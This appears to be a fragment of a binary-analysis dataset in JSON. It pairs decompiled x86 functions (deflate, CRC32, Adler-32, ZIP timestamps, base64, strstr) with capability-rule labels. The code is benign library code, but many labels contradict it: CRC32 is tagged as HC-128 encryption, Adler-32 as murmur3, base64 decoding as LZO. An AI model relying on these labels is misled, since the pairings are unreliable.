        "decompiled_code": "\nvoid __cdecl fcn.00428260(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint arg_10h_00;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = 7;\n    iVar2 = 4;\n    if (*(arg_ch + 2) == 0) {\n        iVar1 = 0x8a;\n        iVar2 = 3;\n    }\n    if (-1 < arg_10h) {\n        puVar3 = arg_ch + 6;\n        var_8h = arg_10h + 1;\n        iVar5 = 0;\n        uVar7 = *(arg_ch + 2);\n        do {\n            uVar4 = *puVar3;\n            iVar6 = iVar5 + 1;\n            if ((iVar1 <= iVar6) || (uVar7 != uVar4)) {\n                if (iVar6 < iVar2) {\n                    do {\n                        fcn.00426410(arg_8h, *(arg_8h + 0xef4 + uVar7 * 4), *(arg_8h + 0xef6 + uVar7 * 4));\n                        iVar6 = iVar6 + -1;\n                    } while (iVar6 != 0);\n                }\n                else {\n                    if (uVar7 == 0) {\n                        if (iVar6 < 0xb) {\n                            fcn.00426410(arg_8h, *(arg_8h + 0xf38), *(arg_8h + 0xf3a));\n                            arg_10h_00 = 3;\n                            iVar6 = iVar5 + -2;\n                        }\n                        else {\n                            fcn.00426410(arg_8h, *(arg_8h + 0xf3c), *(arg_8h + 0xf3e));\n                            arg_10h_00 = 7;\n                            iVar6 = iVar5 + -10;\n                        }\n                    }\n                    else {\n                        if (uVar7 != var_4h) {\n                            fcn.00426410(arg_8h, *(arg_8h + 0xef4 + uVar7 * 4), *(arg_8h + 0xef6 + uVar7 * 4));\n                            iVar6 = iVar5;\n                        }\n                        fcn.00426410(arg_8h, *(arg_8h + 0xf34), *(arg_8h + 0xf36));\n                        arg_10h_00 = 2;\n                        iVar6 = iVar6 + -3;\n                    }\n                    fcn.00426410(arg_8h, iVar6, arg_10h_00);\n                }\n                iVar6 = 0;\n                var_4h = uVar7;\n                if (uVar4 == 0) {\n                    iVar1 = 0x8a;\n                    iVar2 = 3;\n                }\n                else if (uVar7 == uVar4) {\n                    iVar1 = 6;\n                    iVar2 = 3;\n                }\n                else {\n                    iVar1 = 7;\n                    iVar2 = 4;\n                }\n            }\n            puVar3 = puVar3 + 2;\n            var_8h = var_8h + -1;\n            iVar5 = iVar6;\n            uVar7 = uVar4;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "004072f0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004072f0(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_ch == NULL) {\n        return 0;\n    }\n    arg_8h = ~arg_8h;\n    if (7 < arg_10h) {\n        uVar2 = arg_10h >> 3;\n        do {\n            uVar1 = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[1] ^ uVar1) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[2] ^ uVar1) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[3] ^ uVar1) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[4] ^ uVar1) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[5] ^ uVar1) & 0xff) * 4 + 0x446800);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[6] ^ uVar1) & 0xff) * 4 + 0x446800);\n            arg_8h = uVar1 >> 8 ^ *(((arg_ch[7] ^ uVar1) & 0xff) * 4 + 0x446800);\n            arg_ch = arg_ch + 8;\n            arg_10h = arg_10h - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n        arg_8h = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x446800);\n        arg_ch = arg_ch + 1;\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 555
    },
    "004271d0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004271d0(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_ch == NULL) {\n        return 0;\n    }\n    arg_8h = ~arg_8h;\n    if (7 < arg_10h) {\n        uVar2 = arg_10h >> 3;\n        do {\n            uVar1 = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[1] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[2] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[3] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[4] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[5] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[6] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            arg_8h = uVar1 >> 8 ^ *(((arg_ch[7] ^ uVar1) & 0xff) * 4 + 0x4483b8);\n            arg_ch = arg_ch + 8;\n            arg_10h = arg_10h - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n        arg_8h = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x4483b8);\n        arg_ch = arg_ch + 1;\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 573
    },
    "00407400": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407400(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((arg_ch ^ *arg_8h) & 0xff) * 4 + 0x446800) ^ *arg_8h >> 8;\n    *arg_8h = uVar1;\n    uVar1 = ((uVar1 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar1;\n    arg_8h[2] = arg_8h[2] >> 8 ^ *(((uVar1 >> 0x18 ^ arg_8h[2]) & 0xff) * 4 + 0x446800);\n    return;\n}\n",
        "token_count": 188
    },
    "00407450": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407450(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = arg_8h[2];\n    uVar2 = uVar1 & 0xfffd | 2;\n    uVar2 = *(((arg_ch ^ (uVar2 ^ 1) * uVar2 >> 8 ^ *arg_8h) & 0xff) * 4 + 0x446800) ^ *arg_8h >> 8;\n    *arg_8h = uVar2;\n    uVar2 = ((uVar2 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar2;\n    arg_8h[2] = uVar1 >> 8 ^ *(((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4 + 0x446800);\n    return;\n}\n",
        "token_count": 234
    },
    "0041aa00": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041aa00(char *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_10h_00;\n    uint unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_40h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ebc8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_24h = *0x447a94;\n    var_20h = *0x447a98;\n    var_1ch = *0x447a9c;\n    var_18h = *0x447aa0;\n    var_14h._0_1_ = *0x447aa4;\n    iVar1 = (**0x469150)(arg_8h, var_10h);\n    if (((0 < iVar1) && (iVar1 = fcn.0042db40(&var_24h, *arg_8h),  iVar1 != 0)) &&\n       (iVar1 = fcn.0042db40(&var_24h, arg_8h[1]),  iVar1 != 0)) {\n        iVar1 = (**0x469150)(arg_8h);\n        iVar1 = iVar1 + -1;\n        *arg_10h = iVar1;\n        uVar2 = (**0x4692b4)(8, iVar1);\n        iVar3 = (**0x46923c)(uVar2);\n        *arg_ch = iVar3;\n        if (iVar3 != 0) {\n            fcn.00406370(arg_8h);\n            var_4h = 0;\n            arg_10h_00 = fcn.0040e670(&var_5ch, 2, 0xffffffff);\n            if (0xf < arg_10h_00[5]) {\n                arg_10h_00 = *arg_10h_00;\n            }\n            fcn.0042b811(*arg_ch, iVar1, arg_10h_00);\n            fcn.00405ce0();\n            fcn.00405ce0();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_EBX);\n    return;\n}\n",
        "token_count": 648
    },
    "004272e0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004272e0(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((arg_ch ^ *arg_8h) & 0xff) * 4 + 0x4483b8) ^ *arg_8h >> 8;\n    *arg_8h = uVar1;\n    uVar1 = ((uVar1 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar1;\n    arg_8h[2] = arg_8h[2] >> 8 ^ *(((uVar1 >> 0x18 ^ arg_8h[2]) & 0xff) * 4 + 0x4483b8);\n    return;\n}\n",
        "token_count": 193
    },
    "004074c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004074c0(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar2 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == NULL) {\n        return 1;\n    }\n    if (arg_10h != 0) {\n        do {\n            uVar1 = arg_10h;\n            if (0x15af < arg_10h) {\n                uVar1 = 0x15b0;\n            }\n            arg_10h = arg_10h - uVar1;\n            if (0xf < uVar1) {\n                uVar18 = uVar1 >> 4;\n                uVar1 = uVar1 + uVar18 * -0x10;\n                do {\n                    iVar3 = uVar2 + *arg_ch;\n                    iVar4 = iVar3 + arg_ch[1];\n                    iVar5 = iVar4 + arg_ch[2];\n                    iVar6 = iVar5 + arg_ch[3];\n                    iVar7 = iVar6 + arg_ch[4];\n                    iVar8 = iVar7 + arg_ch[5];\n                    iVar9 = iVar8 + arg_ch[6];\n                    iVar10 = iVar9 + arg_ch[7];\n                    iVar11 = iVar10 + arg_ch[8];\n                    iVar12 = iVar11 + arg_ch[9];\n                    iVar13 = iVar12 + arg_ch[10];\n                    iVar14 = iVar13 + arg_ch[0xb];\n                    iVar15 = iVar14 + arg_ch[0xc];\n                    iVar16 = iVar15 + arg_ch[0xd];\n                    iVar17 = iVar16 + arg_ch[0xe];\n                    uVar2 = iVar17 + arg_ch[0xf];\n                    arg_8h = arg_8h + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    arg_ch = arg_ch + 0x10;\n                    uVar18 = uVar18 - 1;\n                } while (uVar18 != 0);\n            }\n            for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n                uVar2 = uVar2 + *arg_ch;\n                arg_ch = arg_ch + 1;\n                arg_8h = arg_8h + uVar2;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            arg_8h = arg_8h % 0xfff1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h << 0x10 | uVar2;\n}\n",
        "token_count": 744
    },
    "00427040": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl\nfcn.00427040(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h, code *arg_1ch, \n            uint arg_20h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_1h;\n    \n    uVar3 = arg_20h;\n    pcVar2 = arg_1ch;\n    (*arg_1ch)(arg_20h, &var_1h, 1);\n    (*pcVar2)(uVar3, &var_1h, 1);\n    arg_1ch = CONCAT13(5, arg_1ch._0_3_);\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = CONCAT13(6, arg_1ch._0_3_);\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    uVar1 = arg_8h;\n    arg_1ch = arg_1ch & 0xffffff | arg_8h << 0x18;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    uVar5 = uVar1 >> 8;\n    arg_1ch = arg_1ch & 0xffffff | uVar5 << 0x18;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_8h = arg_8h & 0xffffff | arg_8h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | uVar5 << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_ch;\n    arg_8h = arg_8h & 0xffffff | arg_ch << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 0x10) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = uVar1 & 0xff000000 | arg_8h & 0xffffff;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_10h;\n    arg_8h = arg_8h & 0xffffff | arg_10h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 0x10) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = uVar1 & 0xff000000 | arg_8h & 0xffffff;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_14h;\n    arg_8h = arg_8h & 0xffffff | arg_14h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    if (uVar1 != 0) {\n        uVar4 = (*pcVar2)(uVar3, arg_18h, uVar1);\n        if (uVar4 != uVar1) {\n            return 10;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1204
    },
    "00433d70": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.00433d70(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar9 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar9[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar9[2]) break;\n            pcVar1 = pcVar9 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar9 = pcVar9 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 923
    },
    "00427ba0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427ba0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    ulong uVar3;\n    uint arg_8h_00;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = arg_8h;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    *(in_ECX + 0x88) = arg_ch;\n    *(in_ECX + 0x8c) = 0;\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        *(in_ECX + 0x70) = arg_ch;\n        *(in_ECX + 0x4c) = 0x80000000;\n        *(in_ECX + 0x6c) = 1;\n        (**0x4691e0)(&var_24h);\n        (**0x4691fc)(&var_24h, &var_2ch);\n        var_34h = var_2ch;\n        var_30h = var_28h;\n        (**0x4692ec)(&var_34h, &var_14h);\n        arg_8h_00 = 10000000;\n        uVar3 = fcn.0042d920(var_2ch + 0x2ac18000, (var_28h + -0x19db1de) - (var_2ch < 0xd53e8000), 10000000, 0);\n        uVar2 = uVar3 >> 0x20;\n        uVar1 = uVar3;\n        *(in_ECX + 0x50) = uVar1;\n        *(in_ECX + 0x58) = uVar1;\n        *(in_ECX + 0x60) = uVar1;\n        *(in_ECX + 0x5c) = uVar2;\n        *(in_ECX + 100) = uVar2;\n        *(in_ECX + 0x54) = uVar2;\n        *(in_ECX + 0x68) =\n             (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f)\n             << 0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n        fcn.0042ad2a(arg_8h_00);\n        return;\n    }\n    fcn.0042ad2a(var_34h);\n    return;\n}\n",
        "token_count": 820
    },
    "00427ce0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427ce0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint arg_8h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    *(param_1 + 0x7c) = 0;\n    *(param_1 + 0x84) = 0;\n    *(param_1 + 0x80) = 0;\n    *(param_1 + 0x78) = 0;\n    *(param_1 + 0x90) = 0;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x4c) = 0x41c00010;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x6c) = 0;\n    (**0x4691e0)(&var_24h);\n    (**0x4691fc)(&var_24h, &var_2ch);\n    var_34h = var_2ch;\n    var_30h = var_28h;\n    (**0x4692ec)(&var_34h, &var_14h);\n    arg_8h = 10000000;\n    uVar3 = fcn.0042d920(var_2ch + 0x2ac18000, (var_28h + -0x19db1de) - (var_2ch < 0xd53e8000), 10000000, 0);\n    uVar2 = uVar3 >> 0x20;\n    uVar1 = uVar3;\n    *(param_1 + 0x50) = uVar1;\n    *(param_1 + 0x58) = uVar1;\n    *(param_1 + 0x60) = uVar1;\n    *(param_1 + 0x5c) = uVar2;\n    *(param_1 + 100) = uVar2;\n    *(param_1 + 0x54) = uVar2;\n    *(param_1 + 0x68) =\n         (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f) <<\n         0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 712
    },
    "004273f0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004273f0(uint arg_8h, uint noname_1, uint16_t *arg_10h, uint16_t *arg_14h)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint unaff_EDI;\n    uint var_14h;\n    uint var_eh;\n    uint16_t var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_14h;\n    puVar1 = arg_10h;\n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    (**0x4692ec)(&arg_8h, &var_14h);\n    *puVar1 = ((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f;\n    *puVar2 = (var_ah & 0x3f | CONCAT22(var_ah, var_eh._2_2_) << 6) << 5 | var_8h * 2 & 0x1fU;\n    fcn.0042ad2a(unaff_EDI);\n    return;\n}\n",
        "token_count": 310
    },
    "0043c075": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0043c075(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_EDI) {\n        if (*(unaff_EBP + -0x20) != unaff_EDI) {\n            puVar1 = *((*unaff_ESI >> 5) * 4 + 0x46a340) + 4 + (*unaff_ESI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0043ac15(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00420d20": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00420d20(int32_t arg_8h, int32_t arg_ch, uint8_t *arg_10h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    puVar3 = arg_10h;\n    if (0 < arg_ch) {\n        do {\n            *puVar3 = *(*(arg_8h + iVar4) + 0x447f68) * '\\x04' | *(*(arg_8h + 1 + iVar4) + 0x447f68) >> 4;\n            puVar3[1] = *(*(arg_8h + 2 + iVar4) + 0x447f68) >> 2 | *(*(arg_8h + 1 + iVar4) + 0x447f68) << 4;\n            pcVar1 = arg_8h + 2 + iVar4;\n            pcVar2 = arg_8h + 3 + iVar4;\n            iVar4 = iVar4 + 4;\n            puVar3[2] = *(*pcVar1 + 0x447f68) << 6 | *(*pcVar2 + 0x447f68);\n            puVar3 = puVar3 + 3;\n        } while (iVar4 < arg_ch);\n    }\n    if (*(arg_8h + -2 + iVar4) != '=') {\n        if (*(arg_8h + -1 + iVar4) != '=') {\n            *puVar3 = 0;\n            return arg_10h;\n        }\n        *(puVar3 + -1) = 0;\n        return arg_10h;\n    }\n    *(puVar3 + -1) = 0;\n    puVar3[-2] = 0;\n    return arg_10h;\n}\n",
        "token_count": 421
    },
    "00426360": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426360(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar8 = arg_8h;\n    puVar1 = arg_8h + 0x28;\n    puVar2 = arg_8h + 0x2c;\n    puVar3 = arg_8h + 0x24;\n    puVar4 = arg_8h + 0x20;\n    puVar5 = arg_8h + 0x1c;\n    puVar6 = arg_8h + 0x18;\n    puVar7 = arg_8h + 0x14;\n    iVar11 = 0;\n    iVar10 = 0;\n    puVar9 = arg_8h + 0x34;\n    arg_8h = 0x3c;\n    do {\n        iVar11 = iVar11 + puVar9[-2];\n        iVar10 = iVar10 + *puVar9;\n        puVar9 = puVar9 + 4;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    arg_8h = 0;\n    var_4h = 0;\n    puVar9 = iVar8 + 0x218;\n    var_8h = 0x40;\n    do {\n        arg_8h = arg_8h + puVar9[-2];\n        var_4h = var_4h + *puVar9;\n        puVar9 = puVar9 + 4;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    **(iVar8 + 0x1af50) =\n         *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + var_4h + arg_8h <=\n         *(iVar8 + 0x210) + iVar10 + iVar11 >> 2;\n    return;\n}\n",
        "token_count": 555
    },
    "004266d0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
